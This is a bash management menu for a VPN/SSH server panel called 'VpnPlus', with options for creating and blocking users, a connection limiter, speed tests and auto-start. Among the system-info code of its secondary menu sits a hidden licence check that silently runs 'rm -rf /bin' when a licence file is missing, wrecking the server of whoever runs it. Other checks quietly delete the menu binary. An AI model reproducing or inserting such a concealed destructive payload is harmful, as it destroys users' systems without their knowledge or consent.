#!/bin/bash
clear
{
fun_bar () {
comando[0]="$1"
comando[1]="$2"
 (
[[ -e $HOME/fim ]] && rm $HOME/fim
[[ ! -e /usr/lib/vpnplus ]] && rm -rf /bin/menu > /dev/null 2>&1
${comando[0]} -y > /dev/null 2>&1
${comando[1]} -y > /dev/null 2>&1
touch $HOME/fim
 ) > /dev/null 2>&1 &
 tput civis
echo -ne "\033[1;32m["
while true; do
   for((i=0; i<18; i++)); do
   echo -ne "\033[1;31m#"
   sleep .1s
   done
   [[ -e $HOME/fim ]] && rm $HOME/fim && break
   echo -e "\033[1;32m]"
   sleep 1s
   tput cuu1
   tput dl1
   echo -ne "\033[1;32m["
done
echo -e "\033[1;32m]\033[1;32m -\033[1;31m OK!\033[1;32m"
tput cnorm
}
IP=$(cat /etc/IP)
x="OK"
menu ()
{
velocity () {
aguarde () {
comando[0]="$1"
comando[1]="$2"
 (
[[ -e $HOME/fim ]] && rm $HOME/fim
[[ ! -d /etc/VPNPlus ]] && rm -rf /bin/menu
${comando[0]} > /dev/null 2>&1
${comando[1]} > /dev/null 2>&1
touch $HOME/fim
 ) > /dev/null 2>&1 &
 tput civis
echo -ne "    \033[1;32mAGUARDE \033[1;32m- \033[1;32m["
while true; do
   for((i=0; i<18; i++)); do
   echo -ne "\033[1;31m#"
   sleep .1s
   done
   [[ -e $HOME/fim ]] && rm $HOME/fim && break
   echo -e "\033[1;32m]"
   sleep 1s
   tput cuu1
   tput dl1
   echo -ne "      \033[1;32mAGUARDE \033[1;32m- \033[1;32m["
done
echo -e "\033[1;32m]\033[1;32m -\033[1;31m OK!\033[1;32m"
tput cnorm
}
fun_tst () {
speedtest --share > speed
}
echo ""
echo -e "  \033[1;32m      PROBANDO LA VELOCIDAD DEL SERVIDOR!\033[0m"
echo ""
aguarde 'fun_tst'
echo ""
png=$(cat speed | sed -n '5 p' |awk -F : {'print $NF'})
down=$(cat speed | sed -n '7 p' |awk -F :  {'print $NF'})
upl=$(cat speed | sed -n '9 p' |awk -F :  {'print $NF'})
lnk=$(cat speed | sed -n '10 p' |awk {'print $NF'})
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "\033[1;32mPING (LATENCIA): \033[1;31m$png"
echo -e "\033[1;32mDESCARGA: \033[1;31m$down"
echo -e "\033[1;32mSUBIDA: \033[1;31m$upl"
echo -e "\033[1;32mLINK: \033[1;31m$lnk\033[0m"
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
rm -rf $HOME/speed
}
#limiter
function limit1 () {
   clear
   echo -e "\n\033[1;32mINICIANDO EL LIMITE...\033[0m"
   echo ""
   fun_bar 'screen -dmS limiter limiter' 'sleep 3s'
   [[ $(grep -wc "limiter" /etc/autostart) = '0' ]] && {
       echo -e "ps x | grep 'limiter' | grep -v 'grep' && echo 'ON' || screen -dmS limiter limiter" >> /etc/autostart
   } || {
       sed -i '/limiter/d' /etc/autostart
	   echo -e "ps x | grep 'limiter' | grep -v 'grep' && echo 'ON' || screen -dmS limiter limiter" >> /etc/autostart
   }
   echo -e "\n\033[1;32mLIMITE INICIADO!\033[0m"
   sleep 3s
   menu
}
function limit2 () {
   clear
   echo -e "\033[1;31mDETENIENDO El LIMITE...\033[0m"
   echo ""
   fun_stplimiter () {
      sleep 1s
      screen -r -S "limiter" -X quit
      screen -wipe 1>/dev/null 2>/dev/null
      [[ $(grep -wc "limiter" /etc/autostart) != '0' ]] && {
          sed -i '/limiter/d' /etc/autostart
      }
      sleep 1s
   }
   fun_bar 'fun_stplimiter' 'sleep 3s'
   echo -e "\n\033[1;31mLIMITE DETENIDO!\033[0m"
   sleep 3s
   menu
}
function limit_ssh () {
[[ $(ps x | grep "limiter"|grep -v grep |wc -l) = '0' ]] && limit1 || limit2
}

function autoexec () {
   if grep "menu;" /etc/profile > /dev/null; then
      clear
      echo -e "\033[1;31mDETENIENDO AUTO INICIO\033[0m"
      offautmenu () {
         sed -i '/menu;/d' /etc/profile
      }
      echo ""
      fun_bar 'offautmenu'
      echo ""
      echo -e "\033[1;31mAUTO INICIO DETENIDO!\033[0m"
      sleep 3s
      menu2
   else
      clear
      echo -e "\033[1;32mINICIANDO AUTO INICIO...\033[0m"
      autmenu () {
         grep -v "^menu;" /etc/profile > /tmp/tmpass && mv /tmp/tmpass /etc/profile
         echo "menu;" >> /etc/profile
      }
      echo ""
      fun_bar 'autmenu'
      echo ""
      echo -e "\033[1;32mAUTO INICIO AUTOMATICO!\033[0m"
      sleep 3s
      menu2
   fi

}
#menu2
menu2 (){
autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;31m◉ " || echo -e "\033[1;31m○ ")
[[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f2 /etc/issue.net |awk -F "." '{print $1}')
elif [[ "$(grep -c "Debian" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f3 /etc/issue.net)
else
system=$(cut -d' ' -f1 /etc/issue.net)
fi
_ons=$(ps -x | grep sshd | grep -v root | grep priv | wc -l)
[[ "$(cat /etc/VPNPlus/Exp)" != "" ]] && _expuser=$(cat /etc/VPNPlus/Exp) || _expuser="0"
[[ -e /etc/openvpn/openvpn-status.log ]] && _onop=$(grep -c "10.8.0" /etc/openvpn/openvpn-status.log) || _onop="0"
[[ -e /etc/default/dropbear ]] && _drp=$(ps aux | grep dropbear | grep -v grep | wc -l) _ondrp=$(($_drp - 1)) || _ondrp="0"
_onli=$(($_ons + $_onop + $_ondrp))
_ram=$(printf ' %-9s' "$(free -h | grep -i mem | awk {'print $2'})")
_usor=$(printf '%-8s' "$(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2 }')")
_usop=$(printf '%-1s' "$(top -bn1 | awk '/Cpu/ { cpu = "" 100 - $8 "%" }; END { print cpu }')")
_core=$(printf '%-1s' "$(grep -c cpu[0-9] /proc/stat)")
_system=$(printf '%-14s' "$system")
_hora=$(printf '%(%I:%M:%S)T')
_onlin=$(printf '%-5s' "$_onli")
_userexp=$(printf '%-5s' "$_expuser")
_tuser=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
clear
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "\E[44;1;37m               ༒︎     VpnPlus     ༒︎                \E[0m"
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "\033[1;31m SISTEMA            MEMORIA RAM      PROCESADOR"
echo -e "\033[1;31m SO: \033[1;32m$_system \033[1;31mTOTAL:\033[1;32m$_ram \033[1;31mNUCLEOS: \033[1;32m$_core\033[0m"
echo -e "\033[1;31m HORA: \033[1;32m$_hora     \033[1;31mEN USO: \033[1;32m$_usor \033[1;31mEN USO: \033[1;32m$_usop\033[0m"
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "\E[41;1;37m                   𝗠𝗲𝗻𝘂 𝗔𝘃𝗮𝗻𝘇𝗮𝗱𝗼                  \E[0m"
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo ""
echo -e "
\033[1;31m
[\033[1;32m20\033[1;31m] \033[1;32m• \033[1;32mAGREGAR HOST SQUID \033[1;31m [\033[1;32m24\033[1;31m] \033[1;32m• \033[1;32mCONTRASEÑA ROOT \033[1;31m
[\033[1;32m21\033[1;31m] \033[1;32m• \033[1;32mBORRAR HOST SQUID  \033[1;31m [\033[1;32m25\033[1;31m] \033[1;32m• \033[1;32mAUTO INICIO $autm \033[1;31m
[\033[1;32m22\033[1;31m] \033[1;32m• \033[1;32mREINICIAR SISTEMA  \033[1;31m [\033[1;32m26\033[1;31m] \033[1;32m• \033[1;32mACTUALIZAR \033[1;31m
[\033[1;32m23\033[1;31m] \033[1;32m• \033[1;32mREINICIAR SERVICIOS\033[1;31m [\033[1;32m27\033[1;31m] \033[1;32m• \033[1;32mDESINSTALAR\033[1;31m
[\033[1;32m0\033[1;31m]  \033[1;32m• \033[1;32mVOLVER             \033[1;31m [\033[1;32m00\033[1;31m] \033[1;32m• \033[1;32mSALIR \033[1;32m<\033[1;32m<\033[1;31m<\033[1;31m"
echo ""
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo ""
echo -ne "\033[1;31mOPCION \033[1;31m?\033[1;32m: "; read x
case "$x" in
   20)
   clear
   addhost
   echo -ne "\n\033[1;31mENTER \033[1;32mpara volver al \033[1;31mMENU!\033[0m"; read
   menu2
   ;;
   21)
   clear
   delhost
   echo -ne "\n\033[1;31mENTER \033[1;32mpara volver al \033[1;31mMENU!\033[0m"; read
   menu2
   ;;
   22)
   clear
   reiniciarsistema
   ;;
   23)
   clear
   reiniciarservicos
   sleep 3s
   ;;
   24)
   clear
   senharoot
   sleep 3s
   ;;
   25)
   autoexec
   ;;
   26)
   attscript
   ;;
   27)
   clear
   delscript
   ;;
    0)
   menu
   ;;
   00)
   echo -e "\033[1;31mSALIENDO...\033[0m"
   sleep 2s
   clear
   exit;
   ;;
   *)
   echo -e "\n\033[1;31mOpcion Invalida!\033[0m"
   sleep 2s
esac
}
while true $x != "OK"
do
stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "\033[1;31m◉ " || echo -e "\033[1;31m○ ")
stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -e "\033[1;31m◉ " || echo -e "\033[1;31m○ ")
if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f2 /etc/issue.net |awk -F "." '{print $1}')
elif [[ "$(grep -c "Debian" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f3 /etc/issue.net)
else
system=$(cut -d' ' -f1 /etc/issue.net)
fi
_ons=$(ps -x | grep sshd | grep -v root | grep priv | wc -l)
[[ "$(cat /etc/VPNPlus/Exp)" != "" ]] && _expuser=$(cat /etc/VPNPlus/Exp) || _expuser="0"
[[ -e /etc/openvpn/openvpn-status.log ]] && _onop=$(grep -c "10.8.0" /etc/openvpn/openvpn-status.log) || _onop="0"
[[ -e /etc/default/dropbear ]] && _drp=$(ps aux | grep dropbear | grep -v grep | wc -l) _ondrp=$(($_drp - 1)) || _ondrp="0"
_onli=$(($_ons + $_onop + $_ondrp))
_ram=$(printf ' %-9s' "$(free -h | grep -i mem | awk {'print $2'})")
_usor=$(printf '%-8s' "$(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2 }')")
_usop=$(printf '%-1s' "$(top -bn1 | awk '/Cpu/ { cpu = "" 100 - $8 "%" }; END { print cpu }')")
_core=$(printf '%-1s' "$(grep -c cpu[0-9] /proc/stat)")
_system=$(printf '%-14s' "$system")
_hora=$(printf '%(%I:%M:%S)T')
_onlin=$(printf '%-5s' "$_onli")
_userexp=$(printf '%-5s' "$_expuser")
_tuser=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
clear
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "\E[44;1;37m               ༒︎     VpnPlus     ༒︎                \E[0m"
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "\033[1;31m SISTEMA            MEMORIA RAM      PROCESADOR"
echo -e "\033[1;31m SO: \033[1;32m$_system \033[1;31mTOTAL:\033[1;32m$_ram \033[1;31mNUCLEOS: \033[1;32m$_core\033[0m"
echo -e "\033[1;31m HORA: \033[1;32m$_hora     \033[1;31mEN USO: \033[1;32m$_usor \033[1;31mEN USO: \033[1;32m$_usop\033[0m"
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "\033[1;31m EN LINEA: \033[1;32m$_onlin    \033[1;31mCADUCADOS: \033[1;32m$_userexp \033[1;31mTOTAL: \033[1;32m$_tuser\033[0m"
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo ""
echo -e "
\033[1;31m
[\033[1;32m01\033[1;31m] \033[1;32m• \033[1;32mCREAR USUARIO SSH         \033[1;31m[\033[1;32m11\033[1;31m] \033[1;32m• \033[1;32mSPEEDTEST \033[1;31m
[\033[1;32m02\033[1;31m] \033[1;32m• \033[1;32mBLOQUEO DE USUARIOS       \033[1;31m[\033[1;32m12\033[1;31m] \033[1;32m• \033[1;32mBANNER \033[1;31m
[\033[1;32m03\033[1;31m] \033[1;32m• \033[1;32mBORRAR USUARIOS           \033[1;31m[\033[1;32m13\033[1;31m] \033[1;32m• \033[1;32mTRAFICO \033[1;31m
[\033[1;32m04\033[1;31m] \033[1;32m• \033[1;32mUSUARIOS EN LINEA         \033[1;31m[\033[1;32m14\033[1;31m] \033[1;32m• \033[1;32mOPTIMIZAR \033[1;31m
[\033[1;32m05\033[1;31m] \033[1;32m• \033[1;32mCAMBIAR FECHA             \033[1;31m[\033[1;32m15\033[1;31m] \033[1;32m• \033[1;32mBACKUP \033[1;31m
[\033[1;32m06\033[1;31m] \033[1;32m• \033[1;32mCAMBIAR LIMITE            \033[1;31m[\033[1;32m16\033[1;31m] \033[1;32m• \033[1;32mLIMITE $stsl\033[1;31m
[\033[1;32m07\033[1;31m] \033[1;32m• \033[1;32mCAMBIAR CONTRASEÑA        \033[1;31m[\033[1;32m17\033[1;31m] \033[1;32m• \033[1;32mBAD VPN $stsu\033[1;31m
[\033[1;32m08\033[1;31m] \033[1;32m• \033[1;32mBORRAR CADUCADOS          \033[1;31m[\033[1;32m18\033[1;31m] \033[1;32m• \033[1;32mINFO VPS \033[1;31m
[\033[1;32m09\033[1;31m] \033[1;32m• \033[1;32mDETALLE DE USUARIOS       \033[1;31m[\033[1;32m19\033[1;31m] \033[1;32m• \033[1;32mMAS \033[1;31m+ \033[1;32m>\033[1;32m>\033[0m\033[1;31m
[\033[1;32m10\033[1;31m] \033[1;32m• \033[1;32mMODO DE CONEXION          \033[1;31m[\033[1;32m00\033[1;31m] \033[1;32m• \033[1;32mSALIR \033[1;32m<\033[1;32m<\033[1;31m<\033[0m \033[0m"
echo ""
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo ""
echo -ne "\033[1;31mOPCION \033[1;31m?\033[1;32m: "; read x

case "$x" in 
   1 | 01)
   clear
   criarusuario
   echo -ne "\n\033[1;31mENTER \033[1;32mpara volver al \033[1;31mMENU!\033[0m"; read
   ;;
   2 | 02)
   clear
   bloquear
   sleep 3s
   ;;
   3 | 03)
   clear
   remover
   sleep 3s
   ;;
   4 | 04)
   clear
   sshmonitor
   echo -ne "\n\033[1;31mENTER \033[1;32mpara volver al \033[1;31mMENU!\033[0m"; read
   ;;      
   5 | 05)
   clear
   mudardata
   sleep 3s
   ;;
   6 | 06)
   clear
   alterarlimite
   sleep 3s
   ;; 
   7 | 07)
   clear
   alterarsenha
   sleep 3s
   ;;
   8 | 08)
   clear
   expcleaner
   sleep 3s
   ;;     
   9 | 09)
   clear
   infousers
   echo -ne "\n\033[1;31mENTER \033[1;32mpara volver al \033[1;31mMENU!\033[0m"; read
   ;;
   10)
   conexao
   exit;
   ;;
   11)
   clear
   velocity
   echo -ne "\n\033[1;31mENTER \033[1;32mpara volver al \033[1;31mMENU!\033[0m"; read
   ;;
   12)
   clear
   banner
   sleep 3s
   ;;
   13)
   clear
   echo -e "\033[1;32mPARA SALIR CLICK CTRL + C\033[1;32m"
   sleep 4s
   nload
   ;;
   14)
   clear
   otimizar
   echo -ne "\n\033[1;31mENTER \033[1;32mpara volver al \033[1;31mMENU!\033[0m"; read
   ;;
   15)
   userbackup
   echo -ne "\n\033[1;31mENTER \033[1;32mpara volver al \033[1;31mMENU!\033[0m"; read
   ;;
   16)
   limit_ssh
   ;;
   17)
   clear
   badvpn
   exit;
   ;;
   18)
   clear
   detalhes
   echo -ne "\n\033[1;31mENTER \033[1;32mpara volver al \033[1;31mMENU!\033[0m"; read
   ;;
   19)
   menu2
   ;;
   00)
   echo -e "\033[1;31mSALIENDO...\033[0m"
   sleep 2s
   clear
   exit;
   ;;
   *)
   echo -e "\n\033[1;31mOpcion Invalida!\033[0m"
   sleep 2s
esac
done
}
menu
#fim
}